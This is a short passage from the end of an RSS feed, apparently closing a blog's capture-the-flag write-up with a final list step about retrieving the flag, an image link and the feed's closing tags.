controller&lt;/li&gt;&#xA;&lt;li&gt;Retrieved the final flag&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;p class=&#34;imgp&#34;&gt;&#xA;  &lt;img loading=&#34;lazy&#34; src=&#34;https://vamsi200.github.io/images/15.png&#34; alt=&#34;alt&#34;  /&gt;&#xA;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
